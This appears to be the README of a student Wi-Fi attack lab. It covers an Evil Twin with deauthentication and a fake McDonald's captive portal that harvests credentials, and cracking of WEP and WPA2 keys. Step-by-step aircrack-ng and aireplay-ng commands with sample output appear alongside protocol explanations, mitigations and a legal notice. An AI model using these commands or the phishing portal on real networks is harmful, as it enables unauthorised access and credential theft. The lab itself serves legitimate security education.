# 📡 Wi-Fi Attack Lab

> **⚠️ Educational purposes only.** All demonstrations are performed on hardware owned by the project team. No third-party networks were targeted at any point.

**Team:** Théophile PASSET · Jade DEFILHES · Sarah KRIVINE · Yoann CHALIGNE  
**School:** Cybersecurity Project — 2025/2026

---

## 🎯 Overview

This project implements two Wi-Fi security demonstration modules:

- **Module 1 — Evil Twin:** Clones a legitimate Wi-Fi network, forces client disconnection via 802.11 deauth frames, and intercepts credentials through a phishing captive portal.
- **Module 2 — Protocol Evolution:** Comparative demonstration from WEP to WPA3, with a live attack on each protocol generation.

---

## 🖥️ Hardware Architecture

```
Pi A (kali-raspberrypi-A) — IP: 192.168.1.15
├── Role : Attacker
├── wlan0 : built-in chip
├── wlan1 : ALFA RTL8192EU USB adapter (monitor mode + injection)
├── ESP8266 Deauther (Spacehuhn firmware v2.6.1)
└── Captive portal : pi_a/captive_portal/

Pi B (kali-raspberrypi-B) — IP: 192.168.1.44
├── Role : Target AP (legitimate network emulator)
├── wlan0 : built-in brcmfmac chip
└── Scripts : pi_b/switch.sh
```

---

## 📁 Repository Structure

```
wifi_attack_lab/
├── pi_a/
│   ├── attack_wep.sh              # WEP attack (aircrack-ng PTW)
│   ├── attack_wpa2.sh             # WPA2 attack (deauth + handshake capture)
│   ├── start_evil_twin.sh         # Full Evil Twin attack
│   ├── stop_evil_twin.sh          # Clean shutdown
│   └── captive_portal/
│       ├── server.py              # HTTP server (captive portal backend)
│       ├── index.html             # Fake McDonald's login page
│       ├── success.html           # Post-submission redirect page
│       ├── dashboard.html         # Real-time SOC dashboard
│       ├── logo.png               # Portal logo
│       └── credentials.log        # Captured credentials (demo data only)
│
├── pi_b/
│   ├── switch.sh                  # Main AP mode switcher
│   ├── start_mcdo_piB.sh          # Legitimate "Mcdo Free Wifi" network
│   └── configs/
│       ├── hostapd_wep.conf           # WEP (1997)       — VULNERABLE
│       ├── hostapd_wpa1.conf          # WPA1-TKIP (2003) — VULNERABLE
│       ├── hostapd_wpa2.conf          # WPA2 no PMF      — VULNERABLE
│       ├── hostapd_wpa2_pmf1.conf     # WPA2 + PMF optional
│       ├── hostapd_wpa2_pmf2.conf     # WPA2 + PMF mandatory
│       └── hostapd_wpa3.conf          # WPA3-SAE (2018)  — PROTECTED
│
└── README.md
```

---

## 🚀 Quick Start

### Pi B — Switch AP mode

```bash
chmod +x switch.sh
./switch.sh wep      # WEP — vulnerable
./switch.sh wpa1     # WPA1-TKIP — vulnerable
./switch.sh wpa2     # WPA2 no PMF — vulnerable
./switch.sh pmf2     # WPA2 + PMF mandatory — protected
./switch.sh wpa3     # WPA3-SAE — protected
./switch.sh stop     # Stop everything
```

### Pi A — WEP Attack

```bash
# Terminal 1: targeted capture
sudo airodump-ng -c 6 --bssid <BSSID> -w /tmp/wep wlan1

# Terminal 2: ARP injection (generates IVs)
sudo aireplay-ng --arpreplay -b <BSSID> -h <CLIENT_MAC> wlan1

# Terminal 3: crack (after ~30 000 IVs)
sudo aircrack-ng /tmp/wep-01.cap
# → KEY FOUND! [ AA:BB:CC:DD:EE ]
```

### Pi A — WPA2 Attack

```bash
# Terminal 1: targeted capture
sudo airodump-ng -c 6 --bssid <BSSID> -w /tmp/wpa2 wlan1

# Terminal 2: deauth → forces handshake replay
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan1
# → "WPA handshake: B8:27:EB:3D:2F:FA" appears in Terminal 1

# Dictionary crack
sudo aircrack-ng -w /tmp/wordlist.txt /tmp/wpa2-01.cap
# → KEY FOUND! [ password123 ]
```

### Pi A — Full Evil Twin

```bash
# Start legitimate network on Pi B first
./start_mcdo_piB.sh

# Then launch the Evil Twin on Pi A
sudo ./start_evil_twin.sh

# Monitor credentials in real time
tail -f ~/captive_portal/credentials.log

# Dashboard (from browser on same network)
# http://192.168.1.15/dashboard.html

# Stop everything cleanly
sudo ./stop_evil_twin.sh
```

---

## 📊 Protocol Comparison

| Protocol | Year | Offline crack? | Deauth possible? | Demo result |
|----------|------|----------------|------------------|-------------|
| WEP | 1997 | ✅ ~3 min | ✅ Yes | KEY FOUND! [ AA:BB:CC:DD:EE ] |
| WPA1-TKIP | 2003 | ✅ Dictionary | ✅ Yes | Hidden by iOS 14+ / Android 10+ |
| WPA2 (no PMF) | 2004 | ✅ Dictionary | ✅ Yes | KEY FOUND! [ password123 ] |
| WPA2 + PMF | 2009 | ✅ Dictionary | ❌ No | Deauth frames ignored |
| WPA3-SAE | 2018 | ❌ No | ❌ No | Pi brcmfmac driver limitation |

---

## 🔬 How the Attacks Work

### WEP — PTW/FMS Statistical Attack
WEP uses RC4 with a 24-bit IV. After ~30,000 packets, IV collisions allow the PTW algorithm to reconstruct the key byte by byte regardless of key complexity. Mathematically broken since 2001.

### WPA2 — Deauth + Handshake Capture
The 4-Way Handshake contains a MIC (Message Integrity Code) in message 2:
```
PMK  = PBKDF2(passphrase, SSID, 4096)
PTK  = PRF(PMK, ANonce, SNonce, MACs)
MIC  = HMAC-MD5(PTK, message_2)
```
The deauth forces the client to reconnect and replay the handshake. The MIC can then be brute-forced entirely offline — the attacker never interacts with the AP again.

### PMF — The Fix
With `ieee80211w=2`, management frames (including deauth) are cryptographically signed. A forged deauth frame is silently dropped by the client.

---

## 🛡️ Mitigations

| Threat | Mitigation | Effectiveness |
|--------|-----------|---------------|
| WEP cracking | Migrate to WPA2 minimum, WPA3 preferred | 100% — WEP is fundamentally broken |
| WPA2 dictionary attack | Strong random passphrase (20+ chars) + WPA3 | High |
| Deauth / Evil Twin | WPA2 + PMF mandatory (ieee80211w=2) | 100% |
| Captive portal phishing | Never enter credentials on open Wi-Fi portals | Behavioral |
| Traffic interception | VPN on all public networks | High |

---

## ⚙️ Requirements

**Pi A (attacker):**
- Kali Linux ARM
- ALFA RTL8192EU USB Wi-Fi adapter (monitor mode + packet injection)
- `aircrack-ng`, `hostapd`, `dnsmasq`, `python3`
- ESP8266 with Spacehuhn Deauther firmware v2.6.1

**Pi B (target AP):**
- Kali Linux ARM
- `hostapd`, `dnsmasq`

---

## ⚖️ Legal Notice

This project was carried out in a strictly controlled educational environment.  
All tests were performed exclusively on hardware owned by the team members.  
Any reproduction outside an authorized context constitutes a criminal offense under French law (Art. 323-1 Code pénal) and equivalent legislation in other jurisdictions.
